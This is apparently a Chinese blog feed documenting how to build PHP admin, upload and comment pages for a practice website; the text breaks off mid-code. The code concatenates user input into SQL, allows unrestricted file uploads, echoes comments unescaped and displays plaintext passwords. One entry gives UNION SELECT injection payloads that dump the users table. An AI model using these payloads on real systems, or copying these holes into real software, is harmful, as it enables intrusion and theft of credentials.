    <content type="html"><![CDATA[<p>管理员页面分为三部分，分别是管理员信息展示块，users表中普通user信息块和信息管理块</p><p>1，管理员信息展示块</p><p>目前只展示了管理员的用户名和密码</p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;h3&gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">            session_start();</span><br><span class="line">            if(isset($_COOKIE[user]))&#123;</span><br><span class="line">            echo &quot;登录成功&lt;br&gt;&quot;;</span><br><span class="line">            echo &quot;管理员名为：&quot;.$_SESSION[user].&quot; &lt;br&gt;&quot;;</span><br><span class="line">            echo &quot;管理员密码为:&quot;.$_SESSION[pass].&quot;&lt;br&gt;&quot;;</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                echo &quot;失败！&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line">        &lt;/h3&gt;</span><br></pre></td></tr></table></figure><p>效果如图所示：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311151547861.png" alt="image-20231115154756752" style="zoom: 67%;" /><p>2，users表中普通user信息块</p><p>从数据库中查询到信息在页面上以表格的形式分为n行3列，分别显示id.username,password的信息</p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;</span><br><span class="line">        &lt;thead&gt;</span><br><span class="line">            &lt;tr&gt;</span><br><span class="line">                &lt;th&gt;id&lt;/th&gt;</span><br><span class="line">                &lt;th&gt;用户名&lt;/th&gt;</span><br><span class="line">                &lt;th&gt;密码&lt;/th&gt;</span><br><span class="line">            &lt;/tr&gt;</span><br><span class="line">        &lt;/thead&gt;</span><br><span class="line">        &lt;tbody&gt;</span><br><span class="line">            &lt;?php</span><br><span class="line">            session_start();</span><br><span class="line">            $link=new mysqli(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;,&quot;security&quot;);</span><br><span class="line">             //从表中查询数据</span><br><span class="line">            $select=&quot;SELECT * FROM users &quot;;</span><br><span class="line">            $result=$link-&gt;query($select);</span><br><span class="line">            if ($result-&gt;num_rows &gt; 0) &#123;</span><br><span class="line">                // 输出数据</span><br><span class="line">                while($row = $result-&gt;fetch_assoc()) &#123;</span><br><span class="line">                    if($row[&quot;isadm&quot;]==0)&#123;</span><br><span class="line">                        echo &quot;&lt;tr&gt;&lt;td&gt;&quot;. $row[&quot;id&quot;]. &quot;&lt;/td&gt;&lt;td&gt;&quot;. $row[&quot;username&quot;]. &quot;&lt;/td&gt;&lt;td&gt;&quot;. $row[&quot;password&quot;]. &quot;&lt;/td&gt;&lt;/tr&gt;&quot;;</span><br><span class="line">                    &#125;        </span><br><span class="line">                &#125;</span><br><span class="line">            &#125; else &#123;</span><br><span class="line">                echo &quot;&lt;tr&gt;&lt;td&gt;暂无用户数据！&lt;/td&gt;&lt;/tr&gt;&quot;;</span><br><span class="line">            &#125;</span><br><span class="line">            ?&gt;</span><br><span class="line">        &lt;/tbody&gt;</span><br><span class="line">        &lt;/table&gt;</span><br></pre></td></tr></table></figure><p>效果如图所示：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311151540111.png" alt="image-20231115154024471" style="zoom: 50%;" /><p>3，信息管理块</p><p>连接数据库，用一个form表单完成对users表的增删改三个功能</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">&lt;form action=&quot;&quot; method=&quot;post&quot; class=&quot;login-form &quot;&gt;</span><br><span class="line">       id: &lt;input type=&quot;text&quot; name=&quot;id&quot;&gt;</span><br><span class="line">            username: &lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;</span><br><span class="line">            passwword: &lt;input type=&quot;text&quot; name=&quot;pass&quot;&gt;</span><br><span class="line">           &lt;input type=&quot;submit&quot; name=&quot;adduser&quot; value=&quot;添加用户&quot; class=&quot;com&quot; &gt;</span><br><span class="line">           &lt;input type=&quot;submit&quot; name=&quot;upduser&quot; value=&quot;修改用户&quot; class=&quot;com&quot; &gt;</span><br><span class="line">           &lt;input type=&quot;submit&quot; name=&quot;deluser&quot; value=&quot;删除用户&quot; class=&quot;com&quot; &gt;</span><br><span class="line">        &lt;?php</span><br><span class="line">        $uid=trim($_POST[&quot;id&quot;]);</span><br><span class="line">        $uname=trim($_POST[&quot;name&quot;]);</span><br><span class="line">        $upass=trim($_POST[&quot;pass&quot;]);</span><br><span class="line">        if(isset($_POST[&quot;adduser&quot;]))&#123;</span><br><span class="line">            if(empty($uname) || empty($upass))&#123; </span><br><span class="line">                echo &#x27;用户名或密码不能为空！&#x27;;</span><br><span class="line">                exit();</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $insert=&quot;INSERT INTO users (username,password,isadm) VALUES (&#x27;$uname&#x27;,&#x27;$upass&#x27;,0)&quot;;</span><br><span class="line">                $result1=$link-&gt;query($insert);</span><br><span class="line">                if($result1===true)&#123;</span><br><span class="line">                    echo &quot;添加用户成功!&quot;;</span><br><span class="line">                    //header(&quot;Location: admin.php&quot;);</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    echo $insert .&quot;&lt;br&gt;&quot;;</span><br><span class="line">                    echo &quot;添加用户失败！&lt;br&gt;&quot;;</span><br><span class="line">                &#125;    </span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else if(isset($_POST[&quot;upduser&quot;]))&#123;</span><br><span class="line">            if(empty($uid))&#123;</span><br><span class="line">                echo &#x27;用户id不能为空!&#x27;;</span><br><span class="line">                exit();</span><br><span class="line">            &#125;else if(empty($uname) || empty($upass))&#123;</span><br><span class="line">                echo &#x27;用户名或密码不能为空！&#x27;;</span><br><span class="line">                exit();</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $update=&quot;UPDATE users SET username = &#x27;$uname&#x27;, password = &#x27;$upass&#x27; WHERE id = $uid&quot;;</span><br><span class="line">                $result2=$link-&gt;query($update);</span><br><span class="line">                if($result2===true)&#123;</span><br><span class="line">                    echo &quot;更新用户成功！&lt;br&gt;&quot;;</span><br><span class="line">                    //sleep(5);</span><br><span class="line">                    //header(&quot;Location: admin.php&quot;);</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    echo $update .&quot;&lt;br&gt;&quot;;</span><br><span class="line">                    echo &quot;更新用户失败！&lt;br&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else if(isset($_POST[&quot;deluser&quot;]))&#123;</span><br><span class="line">            if(empty($uid))&#123;</span><br><span class="line">                echo &#x27;用户id不能为空!&#x27;;</span><br><span class="line">                exit();</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                $delete=&quot;DELETE FROM users WHERE id = $uid&quot;;</span><br><span class="line">                $result3=$link-&gt;query($delete);</span><br><span class="line">                if($result3===true)&#123;</span><br><span class="line">                    echo &quot;删除用户成功！&quot;;</span><br><span class="line">                    //sleep(5);</span><br><span class="line">                    //header(&quot;Location: admin.php&quot;);</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    echo $delete .&quot;&lt;br&gt;&quot;;</span><br><span class="line">                    echo &quot;删除用户失败！&lt;br&gt;&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        ?&gt;</span><br><span class="line">        &lt;/form&gt;</span><br></pre></td></tr></table></figure><p>效果如图所示：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311151543478.png" alt="image-20231115154354358" style="zoom: 50%;" /><p>4，用html和css将三个&lt;div组件&gt;平分页面为三部分并按照从左到右排列</p><p>代码如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span><br><span class="line">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span><br><span class="line">    &lt;title&gt;三等分页面&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .container &#123;</span><br><span class="line">            display: flex;</span><br><span class="line">            width: 100%;</span><br><span class="line">            height: 100vh;</span><br><span class="line">        &#125;</span><br><span class="line">        .box &#123;</span><br><span class="line">            flex: 1;</span><br><span class="line">            height: 100%;</span><br><span class="line">            display: flex;</span><br><span class="line">            justify-content: center;</span><br><span class="line">            align-items: center;</span><br><span class="line">        &#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div class=&quot;container&quot;&gt;</span><br><span class="line">        &lt;div class=&quot;box&quot; style=&quot;background-color: red;&quot;&gt;1&lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;box&quot; style=&quot;background-color: green;&quot;&gt;2&lt;/div&gt;</span><br><span class="line">        &lt;div class=&quot;box&quot; style=&quot;background-color: blue;&quot;&gt;3&lt;/div&gt;</span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>效果如图所示：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311151546609.png" alt="image-20231115154641407"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;管理员页面分为三部分，分别是管理员信息展示块，users表中普通user信息块和信息管理块&lt;/p&gt;
&lt;p&gt;1，管理员信息展示块&lt;/p&gt;
&lt;p&gt;目前只展示了管理员的用户名和密码&lt;/p&gt;
&lt;p&gt;代码如下：&lt;/p&gt;
&lt;figure class=&quot;highlight plainte</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>十，php搭建主页面功能</title>
    <link href="http://example.com/2023/11/15/%E5%8D%81%EF%BC%8Cphp%E6%90%AD%E5%BB%BA%E4%B8%BB%E9%A1%B5%E9%9D%A2%E5%8A%9F%E8%83%BD/"/>
    <id>http://example.com/2023/11/15/%E5%8D%81%EF%BC%8Cphp%E6%90%AD%E5%BB%BA%E4%B8%BB%E9%A1%B5%E9%9D%A2%E5%8A%9F%E8%83%BD/</id>
    <published>2023-11-15T04:19:34.000Z</published>
    <updated>2023-11-15T04:49:38.000Z</updated>
    
    <content type="html"><![CDATA[<p>1，登录页面有SQL注入漏洞查询数据库名称</p><p>在用户名输入框输入：0’ union select 1,database(),3– -</p><p>2，登录页面有SQL注入罗东查询uses表中的所有数据</p><p>在用户名输入框输入：0’ union select 1,database(),(group_concat(id,username,password)) from security.users– -</p><p>3，新建upload.php文件，编写文件上传功能</p><p>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;Document&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line"></span><br><span class="line">        .ft&#123;</span><br><span class="line">            margin-left: <span class="number">10</span>%;</span><br><span class="line">        &#125;</span><br><span class="line">        .com&#123;</span><br><span class="line">  background-color: <span class="comment">#00BFFF;</span></span><br><span class="line">  border: <span class="number">2</span>px solid white;</span><br><span class="line">  border-radius: <span class="number">10</span>px;</span><br><span class="line">  width: <span class="number">100</span>px;</span><br><span class="line">  height: <span class="number">40</span>px;</span><br><span class="line">  color: white;</span><br><span class="line">  text-align: center;</span><br><span class="line">  line-height: <span class="number">40</span>px;</span><br><span class="line">  font-size: <span class="number">20</span>px;</span><br><span class="line">  margin-bottom: <span class="number">10</span>px;</span><br><span class="line">          margin-top:<span class="number">20</span>px</span><br><span class="line">&#125;</span><br><span class="line">        .com:active&#123;</span><br><span class="line">transform: <span class="title function_ invoke__">translateY</span>(<span class="number">2</span>px);</span><br><span class="line">&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">ft</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h2</span>&gt;文件上传&lt;/<span class="title">h2</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">form</span> <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">action</span>=&quot;&quot; <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">file</span>&quot; &gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">class</span>=&quot;<span class="title">com</span>&quot; <span class="title">value</span>=&quot;点击上传&quot;&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">h3</span>&gt;下面是接收到的文件：&lt;<span class="title">h3</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">    <span class="title">if</span>(<span class="title">isset</span>($<span class="title">_FILES</span>[&#x27;<span class="title">file</span>&#x27;]))</span>&#123;</span><br><span class="line">        <span class="variable">$upload_dir</span>=<span class="string">&quot;upload&quot;</span>;</span><br><span class="line">        <span class="variable">$name</span>=<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="variable">$type</span>=<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;type&quot;</span>];</span><br><span class="line">        <span class="variable">$size</span>=<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>];</span><br><span class="line">        <span class="variable">$tmp_name</span>=<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>];</span><br><span class="line">        <span class="variable">$radmon_name</span>=<span class="variable">$name</span>;</span><br><span class="line">        <span class="variable">$target_path</span>=<span class="variable">$upload_dir</span>.<span class="string">&quot;//&quot;</span>.<span class="variable">$radmon_name</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$tmp_name</span>,<span class="variable">$target_path</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;上传成功！&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;文件名称：&quot;</span> .<span class="variable">$radmon_name</span> .<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;文件大小:&quot;</span> .(<span class="variable">$size</span>/<span class="number">1024</span>) .<span class="string">&quot;KB&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;文件类型:&quot;</span> .<span class="variable">$type</span> .<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;文件地址:&quot;</span> .<span class="variable">$target_path</span> .<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;上传失败！&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/div&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202311151233941.png" alt="image-20231115123034035" style="zoom:50%;" /><p>4，新建mycomments.php文件，编写评论功能</p><p>代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;en&quot;</span>&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;我的评论&lt;/title&gt;</span><br><span class="line">    &lt;style&gt;</span><br><span class="line">        .form1&#123;</span><br><span class="line">            margin-left: <span class="number">10</span>%;</span><br><span class="line">            margin-top: <span class="number">20</span>px;</span><br><span class="line">        &#125;</span><br><span class="line">        .ft&#123;</span><br><span class="line">            margin-left: <span class="number">10</span>%;</span><br><span class="line">        &#125;</span><br><span class="line">        .com&#123;</span><br><span class="line">  background-color: <span class="comment">#00BFFF;</span></span><br><span class="line">  border: <span class="number">2</span>px solid white;</span><br><span class="line">  border-radius: <span class="number">10</span>px;</span><br><span class="line">  width: <span class="number">100</span>px;</span><br><span class="line">  height: <span class="number">40</span>px;</span><br><span class="line">  color: white;</span><br><span class="line">  text-align: center;</span><br><span class="line">  line-height: <span class="number">40</span>px;</span><br><span class="line">  font-size: <span class="number">20</span>px;</span><br><span class="line">  margin-bottom: <span class="number">10</span>px;</span><br><span class="line">          margin-top:<span class="number">20</span>px</span><br><span class="line">&#125;</span><br><span class="line">        .com:active&#123;</span><br><span class="line">transform: <span class="title function_ invoke__">translateY</span>(<span class="number">2</span>px);</span><br><span class="line">&#125;</span><br><span class="line">    &lt;/style&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;post&quot;</span> action=<span class="string">&quot;&quot;</span> <span class="class"><span class="keyword">class</span>=&quot;<span class="title">form1</span>&quot;&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">h3</span> &gt;发表评论：&lt;/<span class="title">h3</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">textarea</span> <span class="title">id</span>=&quot;<span class="title">input</span>&quot; <span class="title">name</span>=&quot;<span class="title">comment</span>&quot; <span class="title">rows</span>=&quot;4&quot; <span class="title">cols</span>=&quot;50&quot; &gt;&lt;/<span class="title">textarea</span>&gt;&lt;<span class="title">br</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">post_com</span>&quot; <span class="title">value</span>=&quot;提交评论&quot; <span class="title">class</span>=&quot;<span class="title">com</span>&quot; &gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    &lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class">    <span class="title">session_start</span>();</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">    $<span class="title">link</span>=<span class="title">new</span> <span class="title">mysqli</span>(&quot;<span class="title">localhost</span>&quot;,&quot;<span class="title">root</span>&quot;,&quot;<span class="title">root</span>&quot;,&quot;<span class="title">security</span>&quot;);</span></span><br><span class="line"><span class="class">    // 检查连接是否成功  </span></span><br><span class="line"><span class="class">    <span class="title">if</span> ($<span class="title">conn</span>-&gt;<span class="title">connect_error</span>) </span>&#123;  </span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;ft&#x27;&gt;数据库连接失败!&lt;/div&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;ft&#x27;&gt;数据库连接成功！&lt;/div&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$comment</span>=<span class="title function_ invoke__">trim</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;comment&#x27;</span>]);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;ft&#x27;&gt; &quot;</span> . <span class="variable">$comment</span> .<span class="string">&quot;&lt;/div&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//向表中插入数据</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;post_com&#x27;</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$comment</span>))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;ft&#x27;&gt;评论内容不能为空！&lt;/div&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$insert</span>=<span class="string">&quot;INSERT INTO comments (comment) VALUES (<span class="subst">$comment</span>)&quot;</span>;</span><br><span class="line"><span class="variable">$result1</span>=<span class="variable">$link</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$insert</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$result1</span>===<span class="literal">true</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;ft&#x27;&gt;评论发表成功！&lt;/div&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;ft&#x27;&gt;&quot;</span>.<span class="variable">$insert</span> .<span class="string">&quot;&lt;/div&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;ft&#x27;&gt;评论发表失败！&lt;/div&gt;&lt;br&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从表中查询数据</span></span><br><span class="line">    <span class="variable">$select</span>=<span class="string">&quot;SELECT comment FROM comments ORDER BY id DESC &quot;</span>;</span><br><span class="line">    <span class="variable">$result2</span>=<span class="variable">$link</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$select</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$result2</span>-&gt;num_rows &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 输出数据</span></span><br><span class="line">        <span class="keyword">while</span>(<span class="variable">$row</span> = <span class="variable">$result2</span>-&gt;<span class="title function_ invoke__">fetch_assoc</span>()) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;div class=&#x27;ft&#x27;&gt;&quot;</span>. <span class="variable">$row</span>[<span class="string">&quot;comment&quot;</span>]. <span 